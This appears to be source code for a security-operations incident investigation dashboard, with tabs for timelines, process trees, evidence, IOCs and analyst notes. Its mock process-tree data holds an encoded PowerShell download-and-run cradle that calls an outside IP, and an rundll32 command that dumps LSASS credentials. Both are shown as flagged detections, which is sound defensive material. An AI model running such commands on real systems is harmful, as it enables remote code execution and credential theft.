import React, { useState, useEffect } from 'react';
import {
  Search,
  Clock,
  ShieldAlert,
  Server,
  User,
  Activity,
  FileCheck2,
  Terminal,
  Layers,
  Sparkles,
  Download,
  Plus,
  Send,
  CheckCircle2,
  AlertTriangle,
  GitBranch,
  Network,
  Lock,
  ExternalLink
} from 'lucide-react';
import { socStore } from '../../services/storage';
import { Incident, ProcessNode, EvidenceItem, AnalystNote } from '../../types/soc';

interface InvestigationWorkspaceProps {
  selectedIncidentId: string | null;
  onAskAI: (prompt: string) => void;
  setActiveView: (view: string) => void;
}

export const InvestigationWorkspace: React.FC<InvestigationWorkspaceProps> = ({
  selectedIncidentId,
  onAskAI,
  setActiveView,
}) => {
  const [incidents, setIncidents] = useState<Incident[]>(socStore.getIncidents());
  const [activeIncident, setActiveIncident] = useState<Incident | null>(null);
  const [activeTab, setActiveTab] = useState<'TIMELINE' | 'PROCESS_TREE' | 'EVIDENCE' | 'NOTES' | 'IOCS'>('TIMELINE');
  const [newNoteText, setNewNoteText] = useState('');
  const [noteType, setNoteType] = useState<'NOTE' | 'HYPOTHESIS' | 'FINDING'>('NOTE');

  useEffect(() => {
    const unsub = socStore.subscribe(() => {
      const currentIncidents = socStore.getIncidents();
      setIncidents(currentIncidents);
      if (selectedIncidentId) {
        const found = currentIncidents.find(i => i.id === selectedIncidentId);
        if (found) setActiveIncident(found);
      } else if (currentIncidents.length > 0 && !activeIncident) {
        setActiveIncident(currentIncidents[0]);
      }
    });
    return unsub;
  }, [selectedIncidentId]);

  useEffect(() => {
    if (incidents.length > 0 && !activeIncident) {
      setActiveIncident(incidents[0]);
    }
  }, [incidents]);

  const handleAddNote = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newNoteText.trim() || !activeIncident) return;
    socStore.addAnalystNote(activeIncident.id, newNoteText, noteType);
    setNewNoteText('');
  };

  const processTreeData: ProcessNode = {
    id: 'p-1',
    name: 'explorer.exe',
    pid: 1028,
    ppid: 480,
    user: 'PC-NITH\\Administrator',
    cmd: 'C:\\Windows\\explorer.exe',
    timestamp: '07:13:00',
    children: [
      {
        id: 'p-2',
        name: 'cmd.exe',
        pid: 3108,
        ppid: 1028,
        user: 'PC-NITH\\Administrator',
        cmd: 'C:\\Windows\\System32\\cmd.exe /c "powershell -EncodedCommand ..."',
        timestamp: '07:14:15',
        children: [
          {
            id: 'p-3',
            name: 'powershell.exe',
            pid: 4912,
            ppid: 3108,
            user: 'PC-NITH\\Administrator',
            cmd: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQA6ADgAMAA4ADAALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=',
            timestamp: '07:14:22',
            isMalicious: true,
            children: [
              {
                id: 'p-4',
                name: 'rundll32.exe (LSASS Dumper)',
                pid: 6180,
                ppid: 4912,
                user: 'NT AUTHORITY\\SYSTEM',
                cmd: 'rundll32.exe C:\\ProgramData\\m.dll,MiniDump 0n484 C:\\ProgramData\\lsass.dmp full',
                timestamp: '07:15:05',
                isMalicious: true,
              },
              {
                id: 'p-5',
                name: 'whoami.exe /priv',
                pid: 6244,
                ppid: 4912,
                user: 'PC-NITH\\Administrator',
                cmd: 'whoami.exe /priv',
                timestamp: '07:15:20',
              },
            ],
          },
        ],
      },
    ],
  };

  const renderProcessNode = (node: ProcessNode, depth: number = 0) => (
    <div key={node.id} className="relative pl-6 py-2">
      {depth > 0 && (
        <div className="absolute left-2 top-0 bottom-0 w-0.5 bg-[#223354]"></div>
      )}
      {depth > 0 && (
        <div className="absolute left-2 top-5 w-4 h-0.5 bg-[#223354]"></div>
      )}

      <div
        className={`p-3 rounded-xl border transition-all ${
          node.isMalicious
            ? 'bg-rose-950/30 border-rose-500/60 shadow-lg shadow-rose-950/40'
            : 'bg-[#0f192c] border-[#1e2d4d]'
        }`}
      >
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div className="flex items-center space-x-2">
            <Terminal className={`w-4 h-4 ${node.isMalicious ? 'text-rose-400 animate-pulse' : 'text-slate-400'}`} />
            <span className="font-mono text-xs font-bold text-white">
              {node.name}
            </span>
            <span className="px-1.5 py-0.2 rounded bg-slate-800 text-[10px] text-cyan-300 font-mono">
              PID: {node.pid}
            </span>
            <span className="text-[10px] text-slate-400">
              User: <strong className="text-slate-300">{node.user}</strong>
            </span>
          </div>

          <span className="text-[10px] text-slate-400 font-mono">{node.timestamp}</span>
        </div>

        <div className="mt-2 bg-[#070b14] p-2 rounded-lg font-mono text-[11px] text-slate-300 break-all border border-[#172238]">
          {node.cmd}
        </div>

        {node.isMalicious && (
          <div className="mt-2 flex items-center space-x-2 text-[10px] text-rose-300">
            <span className="px-1.5 py-0.2 bg-rose-500/20 text-rose-300 rounded font-bold uppercase border border-rose-500/30">
              MITRE ATT&CK T1059.001 / T1003.001
            </span>
            <span>Flagged by Wazuh & FortiEDR Behavioral Engine</span>
          </div>
        )}
      </div>

      {node.children && node.children.map(child => renderProcessNode(child, depth + 1))}
    </div>
  );

  return (
    <div className="p-6 space-y-6 max-w-7xl mx-auto">
      {/* Top Banner */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h1 className="text-xl font-black text-white flex items-center space-x-2">
            <Search className="w-6 h-6 text-cyan-400" />
            <span>Incident Investigation Workspace</span>
          </h1>
          <p className="text-xs text-slate-400 mt-0.5">
            Cross-Correlation Timeline, Process Trees, Forensic Evidence Locker & Autonomous Summaries
          </p>
        </div>

        <div className="flex items-center space-x-2.5">
          <button
            onClick={() => onAskAI(`Generate technical post-mortem report for ${activeIncident?.id}`)}
            className="px-3.5 py-2 rounded-xl bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-300 border border-cyan-500/30 text-xs font-semibold flex items-center space-x-1.5 transition-all shadow-sm"
          >
            <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
            <span>AI Incident Summary</span>
          </button>

          <button
            onClick={() => setActiveView('approvals')}
            className="px-4 py-2 rounded-xl bg-gradient-to-r from-rose-600 to-amber-600 hover:from-rose-500 hover:to-amber-500 text-white font-bold text-xs flex items-center space-x-1.5 shadow-lg shadow-rose-950/40"
          >
            <ShieldAlert className="w-4 h-4" />
            <span>Containment Approvals</span>
          </button>
        </div>
      </div>

      {/* Incident Switcher Pills */}
      <div className="flex items-center space-x-2 overflow-x-auto pb-1">
        {incidents.map((inc) => (
          <button
            key={inc.id}
            onClick={() => setActiveIncident(inc)}
            className={`px-3.5 py-2 rounded-xl text-xs font-medium whitespace-nowrap transition-all border flex items-center space-x-2 ${
              activeIncident?.id === inc.id
                ? 'bg-[#142340] text-cyan-300 border-cyan-500 shadow-md shadow-cyan-950/50'
                : 'bg-[#0e1626] text-slate-400 border-[#1e2d4d] hover:text-slate-200'
            }`}
          >
            <span
              className={`w-2 h-2 rounded-full ${
                inc.severity === 'CRITICAL' ? 'bg-rose-500 animate-pulse' : 'bg-amber-500'
              }`}
            ></span>
            <span className="font-bold">{inc.id}</span>
            <span className="text-slate-400 max-w-[200px] truncate">{inc.title}</span>
          </button>
        ))}
      </div>

      {activeIncident && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left Metadata & Key Info Panel */}
          <div className="lg:col-span-4 space-y-4">
            <div className="bg-[#0b1220] border border-[#1b2742] rounded-2xl p-4 shadow-xl space-y-4">
              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 text-[10px] font-bold uppercase border border-rose-500/30 font-mono">
                    {activeIncident.severity}
                  </span>
                  <span className="text-xs font-bold text-rose-400 font-mono">
                    Risk Score: {activeIncident.riskScore}/100
                  </span>
                </div>
                <h2 className="text-sm font-bold text-white leading-snug">
                  {activeIncident.title}
                </h2>
                <div className="text-[10px] text-slate-400 mt-1 flex items-center space-x-1">
                  <Clock className="w-3 h-3" />
                  <span>Created: {activeIncident.createdAt}</span>
                </div>
              </div>

              {/* Affected Assets & Users */}
              <div className="border-t border-[#1b2742] pt-3 space-y-2">
                <div className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  Targeted Assets & Accounts
                </div>
                <div className="space-y-1.5 text-xs">
                  <div className="flex items-center space-x-2 text-slate-200 bg-[#0e172a] p-2 rounded-xl border border-[#1e2d4d]">
                    <Server className="w-4 h-4 text-cyan-400" />
                    <div>
                      <div className="font-mono text-cyan-300 font-bold">{activeIncident.affectedHosts[0]}</div>
                      <div className="text-[10px] text-slate-400">Endpoint Agent 003 (Finance Subnet)</div>
                    </div>
                  </div>
                  <div className="flex items-center space-x-2 text-slate-200 bg-[#0e172a] p-2 rounded-xl border border-[#1e2d4d]">
                    <User className="w-4 h-4 text-purple-400" />
                    <div>
                      <div className="font-bold">{activeIncident.affectedUsers[0]} & {activeIncident.affectedUsers[1]}</div>
                      <div className="text-[10px] text-slate-400">Cached in LSASS / Entra ID</div>
                    </div>
                  </div>
                </div>
              </div>

              {/* MITRE ATT&CK Matrix Badges */}
              <div className="border-t border-[#1b2742] pt-3 space-y-2">
                <div className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                  MITRE ATT&CK Techniques
                </div>
                <div className="flex flex-wrap gap-1.5">
                  {activeIncident.mitreTechniques.map((tech, idx) => (
                    <span
                      key={idx}
                      className="px-2 py-1 rounded-lg bg-[#111e38] text-amber-300 font-mono text-[10px] border border-amber-500/20"
                    >
                      {tech}
                    </span>
                  ))}
                </div>
              </div>

              {/* TheHive & Shuffle Linkages */}
              <div className="border-t border-[#1b2742] pt-3 space-y-1.5 text-xs text-slate-300">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">TheHive Case:</span>
                  <span className="font-mono text-cyan-400 font-semibold">{activeIncident.theHiveCaseId || 'THEHIVE-408'}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Assigned Lead:</span>
                  <span className="font-semibold">{activeIncident.assignedAnalyst}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Status:</span>
                  <span className="px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 font-mono text-[10px] font-bold">
                    {activeIncident.status}
                  </span>
                </div>
              </div>
            </div>

            {/* AI Executive Summary Card */}
            <div className="bg-gradient-to-br from-[#0c1628] to-[#122344] border border-cyan-500/30 rounded-2xl p-4 shadow-xl space-y-2">
              <div className="flex items-center space-x-2 text-cyan-400 text-xs font-bold uppercase tracking-wider">
                <Sparkles className="w-4 h-4 animate-spin" />
                <span>Vichhai AI Executive Synthesis</span>
              </div>
              <p className="text-xs text-slate-200 leading-relaxed">
                {activeIncident.executiveSummary}
              </p>
            </div>
          </div>

          {/* Right Main Tab Workspace */}
          <div className="lg:col-span-8 bg-[#0b1220] border border-[#1b2742] rounded-2xl p-5 shadow-xl space-y-4">
            {/* Workspace Navigation Tabs */}
            <div className="flex items-center space-x-2 border-b border-[#1b2742] pb-3 overflow-x-auto">
              <button
                onClick={() => setActiveTab('TIMELINE')}
                className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center space-x-1.5 ${
                  activeTab === 'TIMELINE'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <Clock className="w-3.5 h-3.5" />
                <span>Incident Timeline ({activeIncident.timeline.length})</span>
              </button>

              <button
                onClick={() => setActiveTab('PROCESS_TREE')}
                className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center space-x-1.5 ${
                  activeTab === 'PROCESS_TREE'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <GitBranch className="w-3.5 h-3.5" />
                <span>Process Ancestry Tree</span>
              </button>

              <button
                onClick={() => setActiveTab('EVIDENCE')}
                className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center space-x-1.5 ${
                  activeTab === 'EVIDENCE'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <FileCheck2 className="w-3.5 h-3.5" />
                <span>Evidence Locker ({activeIncident.evidence.length})</span>
              </button>

              <button
                onClick={() => setActiveTab('IOCS')}
                className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center space-x-1.5 ${
                  activeTab === 'IOCS'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <Activity className="w-3.5 h-3.5" />
                <span>Active IOCs ({activeIncident.iocs.length})</span>
              </button>

              <button
                onClick={() => setActiveTab('NOTES')}
                className={`px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all flex items-center space-x-1.5 ${
                  activeTab === 'NOTES'
                    ? 'bg-cyan-500/20 text-cyan-300 border border-cyan-500/40'
                    : 'text-slate-400 hover:text-slate-200'
                }`}
              >
                <Layers className="w-3.5 h-3.5" />
                <span>Analyst Notes ({activeIncident.notes.length})</span>
              </button>
            </div>

            {/* Tab 1: Cross-Correlation Timeline */}
            {activeTab === 'TIMELINE' && (
              <div className="space-y-3 max-h-[580px] overflow-y-auto pr-1">
                {activeIncident.timeline.map((event, idx) => (
                  <div
                    key={event.id}
                    className="flex items-start space-x-3 p-3.5 rounded-xl bg-[#0e172a] border border-[#1e2d4d] hover:border-cyan-500/40 transition-all"
                  >
                    <div className="text-center font-mono text-[10px] text-slate-400 pt-0.5 min-w-[70px]">
                      {event.timestamp.split(' ')[1]}
                    </div>

                    <div className="flex-1 space-y-1">
                      <div className="flex items-center space-x-2">
                        <span className="px-2 py-0.2 rounded bg-cyan-500/20 text-cyan-300 font-mono text-[10px] font-bold border border-cyan-500/30">
                          {event.source}
                        </span>
                        <span className="text-xs font-bold text-white">{event.title}</span>
                        {event.mitreCode && (
                          <span className="px-1.5 py-0.2 rounded bg-amber-500/10 text-amber-300 font-mono text-[9px] border border-amber-500/20">
                            {event.mitreCode}
                          </span>
                        )}
                      </div>

                      <p className="text-xs text-slate-300 leading-relaxed">
                        {event.description}
                      </p>

                      <div className="text-[10px] text-slate-400 flex items-center space-x-3 pt-1">
                        <span>Actor/User: <strong className="text-slate-200">{event.actorOrUser}</strong></span>
                        <span>•</span>
                        <span>Target: <strong className="text-cyan-300 font-mono">{event.targetHost}</strong></span>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Tab 2: Visual Process Ancestry Tree */}
            {activeTab === 'PROCESS_TREE' && (
              <div className="space-y-4 max-h-[580px] overflow-y-auto pr-1">
                <div className="p-3 bg-[#080d17] rounded-xl border border-cyan-500/20 text-xs text-slate-300 flex items-center justify-between">
                  <span>Interactive Process Lineage Visualizer (FortiEDR & Wazuh syscheck hook)</span>
                  <span className="text-rose-400 font-mono font-bold">Malicious Child Detected</span>
                </div>
                {renderProcessNode(processTreeData)}
              </div>
            )}

            {/* Tab 3: Forensic Evidence Locker */}
            {activeTab === 'EVIDENCE' && (
              <div className="space-y-3 max-h-[580px] overflow-y-auto pr-1">
                {activeIncident.evidence.map((ev) => (
                  <div
                    key={ev.id}
                    className="p-4 rounded-xl bg-[#0e172a] border border-[#1e2d4d] space-y-2 hover:border-cyan-500/40 transition-all"
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-2">
                        <span className="px-2 py-0.5 rounded bg-blue-500/20 text-blue-300 font-mono text-[10px] font-bold">
                          {ev.type}
                        </span>
                        <h4 className="text-xs font-bold text-white">{ev.title}</h4>
                      </div>
                      <span className="text-[10px] text-slate-400 font-mono">{ev.size}</span>
                    </div>

                    <p className="text-xs text-slate-300">{ev.details}</p>

                    <div className="bg-[#070b14] p-2 rounded-lg font-mono text-[10px] text-cyan-300 break-all border border-[#172238] flex items-center justify-between">
                      <span>{ev.hash}</span>
                      <span className="text-emerald-400 font-bold ml-2">VERIFIED INTEGRITY</span>
                    </div>

                    <div className="flex items-center justify-between text-[10px] text-slate-400 pt-1">
                      <span>Source: {ev.source} ({ev.timestamp})</span>
                      <button
                        onClick={() => alert(`Simulating raw forensic artifact export: ${ev.title}`)}
                        className="text-cyan-400 hover:text-cyan-300 font-semibold flex items-center space-x-1"
                      >
                        <Download className="w-3 h-3" />
                        <span>Export Artifact</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Tab 4: Active IOCs */}
            {activeTab === 'IOCS' && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[580px] overflow-y-auto pr-1">
                {activeIncident.iocs.map((ioc) => (
                  <div
                    key={ioc.id}
                    className="p-3.5 rounded-xl bg-[#0e172a] border border-[#1e2d4d] space-y-2"
                  >
                    <div className="flex items-center justify-between">
                      <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 text-[10px] font-mono font-bold">
                        {ioc.type}
                      </span>
                      <span className="text-[10px] font-mono text-amber-300 font-bold">{ioc.tlp}</span>
                    </div>

                    <div className="font-mono text-xs font-bold text-white break-all">
                      {ioc.value}
                    </div>

                    <div className="text-[11px] text-rose-400 font-medium">
                      {ioc.threatActor || 'APT29 / Cozy Bear'} • {ioc.malwareFamily || 'Cobalt Strike'}
                    </div>

                    <div className="pt-2 border-t border-[#1e2d4d] flex items-center justify-between text-[10px] text-slate-400">
                      <span>Confidence: <strong className="text-emerald-400">{ioc.confidenceScore}%</strong></span>
                      <button
                        onClick={() => onAskAI(`Enrich IOC ${ioc.value} with OpenCTI`)}
                        className="text-cyan-400 hover:underline flex items-center space-x-1"
                      >
                        <Sparkles className="w-3 h-3" />
                        <span>OpenCTI Lookup</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}

            {/* Tab 5: Analyst Notes & Comments */}
            {activeTab === 'NOTES' && (
              <div className="space-y-4 max-h-[580px] overflow-y-auto pr-1">
                <form onSubmit={handleAddNote} className="space-y-2 bg-[#0e172a] p-3 rounded-xl border border-[#1e2d4d]">
                  <div className="flex items-center space-x-2">
                    <span className="text-xs font-bold text-slate-300">Add Entry:</span>
                    <select
                      value={noteType}
                      onChange={(e) => setNoteType(e.target.value as any)}
                      className="bg-[#080d17] text-cyan-300 text-xs rounded-lg px-2 py-1 border border-[#1e2d4d]"
                    >
                      <option value="NOTE">Analyst Note</option>
                      <option value="HYPOTHESIS">Hypothesis</option>
                      <option value="FINDING">Key Finding</option>
                    </select>
                  </div>
                  <textarea
                    value={newNoteText}
                    onChange={(e) => setNewNoteText(e.target.value)}
                    placeholder="Enter observation, timeline finding or hypothesis..."
                    rows={2}
                    className="w-full bg-[#080d17] border border-[#1e2d4d] rounded-xl p-2.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
                  />
                  <div className="flex justify-end">
                    <button
                      type="submit"
                      className="px-3.5 py-1.5 rounded-xl bg-cyan-600 hover:bg-cyan-500 text-white font-semibold text-xs flex items-center space-x-1"
                    >
                      <Send className="w-3 h-3" />
                      <span>Post Note</span>
                    </button>
                  </div>
                </form>

                <div className="space-y-2.5">
                  {activeIncident.notes.map((note) => (
                    <div
                      key={note.id}
                      className={`p-3 rounded-xl border ${
                        note.type === 'AI_GENERATED'
                          ? 'bg-cyan-950/20 border-cyan-500/30'
                          : 'bg-[#0e172a] border-[#1e2d4d]'
                      }`}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <div className="flex items-center space-x-2">
                          <span className="font-bold text-xs text-white">{note.author}</span>
                          <span className="text-[10px] text-cyan-400 font-mono">({note.role})</span>
                          <span className="px-1.5 py-0.2 rounded bg-slate-800 text-[9px] text-slate-300 font-mono">
                            {note.type}
                          </span>
                        </div>
                        <span className="text-[10px] text-slate-400 font-mono">{note.timestamp}</span>
                      </div>
                      <p className="text-xs text-slate-200 leading-relaxed">{note.content}</p>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
